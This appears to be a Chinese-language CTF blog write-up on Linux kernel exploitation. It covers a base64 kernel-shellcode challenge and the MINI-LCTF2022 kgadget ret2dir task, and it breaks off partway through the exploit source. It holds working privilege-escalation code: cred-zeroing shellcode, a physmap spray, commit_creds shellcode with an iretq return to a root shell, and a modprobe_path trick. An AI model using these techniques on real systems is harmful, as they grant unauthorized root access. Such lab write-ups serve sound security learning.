<span class="kn">import</span> <span class="n">base64</span>

<span class="k">def</span> <span class="nf">readuntil</span><span class="p">(</span><span class="n">process</span><span class="p">,</span> <span class="n">until_text</span><span class="p">):</span>
    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
        <span class="n">output</span> <span class="o">=</span> <span class="nf">readline</span><span class="p">(</span><span class="n">process</span><span class="p">)</span>
        <span class="k">if</span> <span class="nf">any</span><span class="p">(</span><span class="n">substring</span> <span class="ow">in</span> <span class="n">output</span> <span class="k">for</span> <span class="n">substring</span> <span class="ow">in</span> <span class="n">until_text</span><span class="p">):</span>
            <span class="k">break</span>
          
    <span class="k">return</span> <span class="n">output</span>

<span class="k">def</span> <span class="nf">readline</span><span class="p">(</span><span class="n">process</span><span class="p">):</span>
    <span class="k">return</span> <span class="n">process</span><span class="p">.</span><span class="n">stdout</span><span class="p">.</span><span class="nf">readline</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">process_qemu</span><span class="p">(</span><span class="n">code</span><span class="p">,</span> <span class="n">start_script</span><span class="p">):</span>
    <span class="n">process</span> <span class="o">=</span> <span class="n">subprocess</span><span class="p">.</span><span class="nc">Popen</span><span class="p">([</span><span class="n">start_script</span><span class="p">],</span> <span class="n">stdin</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">PIPE</span><span class="p">,</span> <span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">PIPE</span><span class="p">,</span> <span class="n">stderr</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">PIPE</span><span class="p">,</span> <span class="n">text</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">bufsize</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
  
    <span class="nf">readuntil</span><span class="p">(</span><span class="n">process</span><span class="p">,</span> <span class="p">[</span><span class="sh">"</span><span class="s">Input ur b64_code: </span><span class="se">\n</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">Power down</span><span class="sh">"</span><span class="p">])</span>
  
    <span class="n">process</span><span class="p">.</span><span class="n">stdin</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">code</span><span class="o">+</span><span class="sh">"</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
  
    <span class="n">result</span> <span class="o">=</span> <span class="nf">readuntil</span><span class="p">(</span><span class="n">process</span><span class="p">,</span> <span class="p">[</span><span class="sh">"</span><span class="s">result</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">Power down</span><span class="sh">"</span><span class="p">])</span>
  
    <span class="k">if</span> <span class="sh">"</span><span class="s">result</span><span class="sh">"</span> <span class="ow">in</span> <span class="n">result</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">result</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="sh">"</span><span class="s">result: </span><span class="sh">"</span><span class="p">,</span> <span class="mi">1</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="sh">"</span><span class="s">dummydummydummy</span><span class="se">\n</span><span class="sh">"</span>
  
<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">'</span><span class="s">__main__</span><span class="sh">'</span><span class="p">:</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Welcome to Generic Linux kernel shellcode Challenge</span><span class="sh">"</span><span class="p">)</span>
    <span class="n">code</span> <span class="o">=</span> <span class="nf">input</span><span class="p">(</span><span class="sh">"</span><span class="s">Input ur b64_code: </span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
  
    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Virtual 1 Working......</span><span class="sh">"</span><span class="p">)</span>
  
    <span class="n">os</span><span class="p">.</span><span class="nf">chdir</span><span class="p">(</span><span class="sh">"</span><span class="s">./vir1</span><span class="sh">"</span><span class="p">)</span>
    <span class="n">key</span> <span class="o">=</span> <span class="nf">process_qemu</span><span class="p">(</span><span class="n">code</span><span class="p">,</span> <span class="sh">"</span><span class="s">./vir1_start.sh</span><span class="sh">"</span><span class="p">).</span><span class="nf">replace</span><span class="p">(</span><span class="sh">'</span><span class="se">\n</span><span class="sh">'</span><span class="p">,</span> <span class="sh">''</span><span class="p">).</span><span class="nf">encode</span><span class="p">(</span><span class="sh">"</span><span class="s">ascii</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Virtual 1 Finished</span><span class="sh">"</span><span class="p">)</span>
  
    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Virtual 2 Working......</span><span class="sh">"</span><span class="p">)</span>
    <span class="n">os</span><span class="p">.</span><span class="nf">chdir</span><span class="p">(</span><span class="sh">"</span><span class="s">../vir2</span><span class="sh">"</span><span class="p">)</span>
    <span class="n">cipher_b64</span> <span class="o">=</span> <span class="nf">process_qemu</span><span class="p">(</span><span class="n">code</span><span class="p">,</span> <span class="sh">"</span><span class="s">./vir2_start.sh</span><span class="sh">"</span><span class="p">).</span><span class="nf">replace</span><span class="p">(</span><span class="sh">'</span><span class="se">\n</span><span class="sh">'</span><span class="p">,</span> <span class="sh">''</span><span class="p">).</span><span class="nf">encode</span><span class="p">(</span><span class="sh">"</span><span class="s">ascii</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Virtual 2 Finished</span><span class="sh">"</span><span class="p">)</span>
  
    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Calc ur result......</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">cipher: </span><span class="sh">'</span><span class="p">,</span><span class="n">cipher_b64</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">key: </span><span class="sh">'</span><span class="p">,</span> <span class="n">key</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">cipher_b64</span><span class="p">.</span><span class="nf">find</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">dummy</span><span class="sh">"</span><span class="p">)</span><span class="o">!=-</span><span class="mi">1</span> <span class="ow">or</span> <span class="n">key</span><span class="p">.</span><span class="nf">find</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">dummy</span><span class="sh">"</span><span class="p">)</span><span class="o">!=-</span><span class="mi">1</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Bad kernel shellcode</span><span class="sh">"</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">cipher_raw</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="nf">b64decode</span><span class="p">(</span><span class="n">cipher_b64</span><span class="p">)</span>
        <span class="n">cipher</span> <span class="o">=</span> <span class="n">AES</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">AES</span><span class="p">.</span><span class="n">MODE_ECB</span><span class="p">)</span>
        <span class="n">decrypted</span> <span class="o">=</span> <span class="n">cipher</span><span class="p">.</span><span class="nf">decrypt</span><span class="p">(</span><span class="n">cipher_raw</span><span class="p">).</span><span class="nf">rstrip</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">).</span><span class="nf">decode</span><span class="p">(</span><span class="sh">"</span><span class="s">ascii</span><span class="sh">"</span><span class="p">)</span>
      
        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Nice kernel shellcode</span><span class="sh">"</span><span class="p">)</span>
        <span class="nf">print</span><span class="p">(</span><span class="n">decrypted</span><span class="p">)</span>

</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<p>‍</p>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20241126173810-iffvhny.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20241126173810-iffvhny.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<p>‍</p>

<ul>
  <li>
    <p>大概就是用一个shellcode(base64编码) 去打 两个 kernl</p>
  </li>
  <li>
    <p>启动server.py 后执行的程序</p>
  </li>
</ul>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
</pre></td><td class="rouge-code"><pre><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-18h]</span>
  <span class="kt">int</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// [rsp+Ch] [rbp-14h]</span>
  <span class="kt">int</span> <span class="n">v6</span><span class="p">;</span> <span class="c1">// [rsp+10h] [rbp-10h]</span>
  <span class="kt">int</span> <span class="n">v7</span><span class="p">;</span> <span class="c1">// [rsp+14h] [rbp-Ch]</span>
  <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-8h]</span>
  <span class="kt">int</span> <span class="n">v9</span><span class="p">;</span> <span class="c1">// [rsp+1Ch] [rbp-4h]</span>

  <span class="n">puts</span><span class="p">(</span><span class="s">"Input ur b64_code: "</span><span class="p">);</span>
  <span class="n">v9</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">code</span><span class="p">,</span> <span class="mh">0x1000uLL</span><span class="p">);</span>
  <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/tmp/b64_code"</span><span class="p">,</span> <span class="mi">66</span><span class="p">);</span>
  <span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">code</span><span class="p">,</span> <span class="n">v9</span><span class="p">);</span>
  <span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
  <span class="n">system</span><span class="p">(</span><span class="s">"chmod 622 /tmp/b64_code &amp;&amp; base64 -d /tmp/b64_code &gt; /tmp/code"</span><span class="p">);</span>
  <span class="n">v7</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/tmp/code"</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
  <span class="n">v6</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">v7</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">code</span><span class="p">,</span> <span class="mh">0x1000uLL</span><span class="p">);</span>
  <span class="n">close</span><span class="p">(</span><span class="n">v7</span><span class="p">);</span>
  <span class="n">v5</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/proc/kernel_shell"</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
  <span class="n">read</span><span class="p">(</span><span class="n">v5</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">code</span><span class="p">,</span> <span class="n">v6</span><span class="p">);</span>		<span class="c1">// 内核shellcode 提权</span>
  <span class="n">v4</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/flag"</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span> <span class="c1">// root 用户可读</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">v4</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"result: dummydummydummy"</span><span class="p">);</span>
    <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="n">read</span><span class="p">(</span><span class="n">v4</span><span class="p">,</span> <span class="n">flag</span><span class="p">,</span> <span class="mh">0x100uLL</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"result: "</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="n">flag</span><span class="p">);</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<ul>
  <li>vir1  flag 文件存着 aes key</li>
  <li>vir2 flag 文件存着 aes 密文</li>
</ul>

<p>‍</p>

<h3 id="其他信息"><span class="me-2">其他信息</span><a href="#其他信息" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>‍</p>

<p>kernel 均在 6.x 以上，</p>

<p>‍</p>

<ul>
  <li>启动命令， 开了 kaslr 地址随机化，</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre></td><td class="rouge-code"><pre><span class="c">#!/bin/bash</span>

<span class="nb">exec </span>qemu-system-x86_64 <span class="se">\</span>
	<span class="nt">-m</span> 64M <span class="se">\</span>
	<span class="nt">-kernel</span> ./bzImage <span class="se">\</span>
	<span class="nt">-initrd</span> ./rootfs.cpio <span class="se">\</span>
	<span class="nt">-append</span> <span class="s2">"console=ttyS0 kaslr quiet"</span> <span class="se">\</span>
	<span class="nt">-cpu</span> kvm64,+smap,smep<span class="se">\</span>
	<span class="nt">-smp</span> <span class="nv">cores</span><span class="o">=</span>1,threads<span class="o">=</span>1 <span class="se">\</span>
	<span class="nt">-nographic</span> <span class="se">\</span>
	<span class="nt">-no-reboot</span>

</pre></td></tr></tbody></table></code></div></div>

<h3 id="思考"><span class="me-2">思考</span><a href="#思考" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>‍</p>

<ul>
  <li>整体不难，主要是kernel 题做得少，经验不足比赛中没做出来</li>
  <li>大部分思路在这</li>
</ul>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20241126174654-s80dct7.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20241126174654-s80dct7.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<h3 id="exploit-3"><span class="me-2">exploit</span><a href="#exploit-3" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>‍</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
</pre></td><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="sh">'</span><span class="s">amd64</span><span class="sh">'</span>


<span class="n">sc</span> <span class="o">=</span> <span class="sh">'''</span><span class="s">
mov rbx, qword ptr gs:[0x2a100]
cmp rbx,0   /*vir2 取到是空的，由此用来判断是哪台靶机，执行不同的shellcode*/
je v2
add rbx,0x700
mov rdi,[rbx]
mov qword ptr [rdi + 0x04],0
mov qword ptr [rdi + 0x0C],0
mov qword ptr [rdi + 0x14],0
mov qword ptr [rdi + 0x1C],0
sub rbx, 0x38
mov rbx, [rbx]
sub rbx, 0x118c00
add rbx, 0x800092 /* return */
push rbx
ret

v2:
mov rbx, qword ptr gs:[0x2a7c0]
add rbx,0x700
mov rdi,[rbx]
mov qword ptr [rdi + 0x04],0
mov qword ptr [rdi + 0x0C],0
mov qword ptr [rdi + 0x14],0
mov qword ptr [rdi + 0x1C],0
sub rbx, 0x38
mov rbx, [rbx]
sub rbx, 0x136f60
add rbx, 0xa00134 /* return */
push rbx
ret
</span><span class="sh">'''</span>


<span class="n">sc</span> <span class="o">=</span> <span class="nf">asm</span><span class="p">(</span><span class="n">sc</span><span class="p">)</span>

<span class="nf">print</span><span class="p">(</span><span class="nf">b64e</span><span class="p">(</span><span class="n">sc</span><span class="p">))</span>

</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<p>‍</p>

<h2 id="mini-lctf2022-kgadgetret2dir"><span class="me-2">MINI-LCTF2022-kgadget–ret2dir</span><a href="#mini-lctf2022-kgadgetret2dir" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<h3 id="分析题目"><span class="me-2">分析题目</span><a href="#分析题目" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<ul>
  <li>​<code class="language-plaintext highlighter-rouge">nokaslr</code>​</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre></td><td class="rouge-code"><pre>qemu-system-x86_64 <span class="se">\</span>
	<span class="nt">-m</span> 256M <span class="se">\</span>
	<span class="nt">-cpu</span> kvm64,+smep,+smap <span class="se">\</span>
	<span class="nt">-smp</span> <span class="nv">cores</span><span class="o">=</span>2,threads<span class="o">=</span>2 <span class="se">\</span>
	<span class="nt">-kernel</span> bzImage <span class="se">\</span>
	<span class="nt">-initrd</span> ./rootfs.cpio <span class="se">\</span>
	<span class="nt">-nographic</span> <span class="se">\</span>
	<span class="nt">-monitor</span> /dev/null <span class="se">\</span>
	<span class="nt">-snapshot</span> <span class="se">\</span>
	<span class="nt">-append</span> <span class="s2">"console=ttyS0 nokaslr pti=on quiet oops=panic panic=1"</span> <span class="se">\</span>
	<span class="nt">-no-reboot</span> <span class="se">\</span>
	<span class="nt">-s</span>

</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<p>​<code class="language-plaintext highlighter-rouge">param</code>​ 传入一个指针，后面后 call 这个指针里存的地址</p>

<p>‍</p>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20241202103035-k7bncdy.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20241202103035-k7bncdy.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<h3 id="调试分析"><span class="me-2">调试分析</span><a href="#调试分析" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>‍</p>

<ul>
  <li>在用户态构造大量的 page, 然后可以在 kernel <code class="language-plaintext highlighter-rouge">direct mapping</code>​ 找到我们的数据</li>
</ul>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20241202103343-497p64e.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20241202103343-497p64e.png" alt="image" loading="lazy"></a>​</p>

<ul>
  <li>关键代码</li>
</ul>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
</pre></td><td class="rouge-code"><pre><span class="kt">void</span> <span class="nf">physmap_spary</span><span class="p">()</span>
<span class="p">{</span>
        <span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="kt">size_t</span><span class="o">*</span> <span class="n">rop</span><span class="p">;</span>
        <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">15000</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
        <span class="p">{</span>
                <span class="n">rop</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="mi">4096</span><span class="p">,</span> <span class="n">PROT_READ</span><span class="o">|</span><span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_ANONYMOUS</span><span class="o">|</span><span class="n">MAP_PRIVATE</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
                <span class="k">for</span> <span class="p">(</span><span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="mi">4096</span><span class="o">/</span><span class="mi">8</span><span class="p">;</span> <span class="n">j</span><span class="o">++</span><span class="p">)</span> <span class="n">rop</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xbeefbeef</span><span class="p">;</span>
        <span class="p">}</span>
<span class="p">}</span>


<span class="p">......</span>

<span class="n">__asm__</span><span class="p">(</span>
        <span class="s">"mov r15, 0x1111;"</span>
        <span class="s">"mov r14, 0x2222;"</span>
        <span class="s">"mov r13, 0x3333;"</span>
        <span class="s">"mov r12, 0x4444;"</span>
        <span class="s">"mov r11, 0x5555;"</span>
        <span class="s">"mov r10, 0x6666;"</span>
        <span class="s">"mov r9,  0x7777;"</span>
        <span class="s">"mov r8,  0x8888;"</span>
        <span class="s">"mov rcx, 0x9999;"</span>
        <span class="s">"mov rbx, 0xaaaa;"</span>
        <span class="s">"mov rdx, 0xffff888000000000+0x6000000;"</span> <span class="c1">// 这里</span>
        <span class="s">"mov rsi, 0x1BF52;"</span>
        <span class="s">"mov rdi, fd;"</span>
        <span class="s">"mov rax, 0x10;"</span>
        <span class="s">"syscall;"</span>
        <span class="p">);</span>
</pre></td></tr></tbody></table></code></div></div>

<p>仅仅控制 一个 RIP 是不能够 达到提权的的，我们需要利用现有的信息</p>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20241202103142-e0ejg57.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20241202103142-e0ejg57.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<ul>
  <li>r9 和 r8 寄存器的值</li>
</ul>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20241202104147-l7wkvlf.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20241202104147-l7wkvlf.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<ul>
  <li>拟</li>
</ul>

<blockquote>
  <p>如果执行的是 add rsp,0xc0, 然后 0x7777 处是 pop rsp;ret   0x8888 是新的stack 那岂不是可以直接 ROP 了</p>
</blockquote>

<p>‍</p>

<p>‍</p>

<h3 id="exploit-text"><span class="me-2">exploit-text</span><a href="#exploit-text" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<ul>
  <li>测试</li>
</ul>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20241202114507-k0xq25h.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20241202114507-k0xq25h.png" alt="image" loading="lazy"></a>​</p>

<ul>
  <li>exp.c</li>
</ul>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
</pre></td><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">"minilib.h"</span><span class="cp">
</span>
<span class="kt">char</span> <span class="n">flag</span><span class="p">[</span><span class="mh">0x50</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>

<span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>

<span class="kt">size_t</span> <span class="n">user_cs</span><span class="p">,</span> <span class="n">user_ss</span><span class="p">,</span> <span class="n">user_rflags</span><span class="p">,</span> <span class="n">user_sp</span><span class="p">;</span>
<span class="kt">void</span> <span class="nf">save_status</span><span class="p">(){</span>
    <span class="n">asm</span> <span class="k">volatile</span> <span class="p">(</span>
        <span class="s">"mov user_cs, cs;"</span>
        <span class="s">"mov user_ss, ss;"</span>
        <span class="s">"mov user_sp, rsp;"</span>
        <span class="s">"pushf;"</span>
        <span class="s">"pop user_rflags;"</span>
    <span class="p">);</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"</span><span class="se">\033</span><span class="s">[34m</span><span class="se">\033</span><span class="s">[1m[*] Status has been saved.</span><span class="se">\033</span><span class="s">[0m"</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">void</span> <span class="nf">get_root_shell</span><span class="p">(){</span>
    <span class="kt">int</span> <span class="n">uid</span> <span class="o">=</span> <span class="n">getuid</span><span class="p">();</span>
    <span class="n">hex</span><span class="p">(</span><span class="n">uid</span><span class="p">);</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">);</span>
    <span class="c1">//chmod("/flag",0777);</span>
    <span class="n">syscall64</span><span class="p">(</span><span class="mi">60</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>
<span class="k">static</span> <span class="kt">size_t</span> <span class="n">shell_addr</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">get_root_shell</span><span class="p">;</span>

<span class="k">static</span> <span class="kt">void</span> <span class="nf">shellcode</span><span class="p">(){</span>
    <span class="n">asm</span> <span class="k">volatile</span> <span class="p">(</span>
        <span class="s">"xor rdi, rdi;"</span>
        <span class="s">"mov rcx, prepare_kernel_cred;"</span>
        <span class="s">"call rcx;"</span>
        <span class="s">"mov rcx, commit_creds;"</span>
        <span class="s">"call rcx;"</span>
        <span class="c1">// swapgs_restore_regs_and_return_to_usermode -- mov rdi,rsp</span>
    <span class="p">);</span>
    <span class="c1">// restore_flags</span>
    <span class="n">asm</span> <span class="k">volatile</span> <span class="p">(</span>
        <span class="s">"nop;"</span>
        <span class="s">"nop;"</span>
        <span class="s">"push user_ss;"</span>
        <span class="s">"push user_sp;"</span>
        <span class="s">"push user_rflags;"</span>
        <span class="s">"push user_cs;"</span>
        <span class="s">"push shell_addr;"</span>
        <span class="s">"swapgs;"</span>
        <span class="s">"iretq;"</span>
    <span class="p">);</span>
<span class="p">}</span><span class="kt">size_t</span> <span class="n">sc_addr</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">shellcode</span> <span class="o">+</span> <span class="mi">8</span><span class="p">;</span>

<span class="kt">void</span> <span class="nf">modprobe_rce</span><span class="p">(){</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"echo -ne '#!/bin/sh</span><span class="se">\n</span><span class="s">/bin/chmod 777 /flag</span><span class="se">\n</span><span class="s">' &gt; /tmp/e1"</span><span class="p">);</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"chmod +x /tmp/e1"</span><span class="p">);</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"echo -ne '</span><span class="se">\\</span><span class="s">xff</span><span class="se">\\</span><span class="s">xff</span><span class="se">\\</span><span class="s">xff</span><span class="se">\\</span><span class="s">xff' &gt; /tmp/e2"</span><span class="p">);</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"chmod +x /tmp/e2"</span><span class="p">);</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"/tmp/e2"</span><span class="p">);</span>      <span class="c1">// sh: /tmp/e2: Permission denied</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"/tmp/e2"</span><span class="p">);</span>      <span class="c1">// ./tmp/e2: line 1: : not found</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"cat /flag"</span><span class="p">);</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"cat /flag"</span><span class="p">);</span>
<span class="p">}</span>


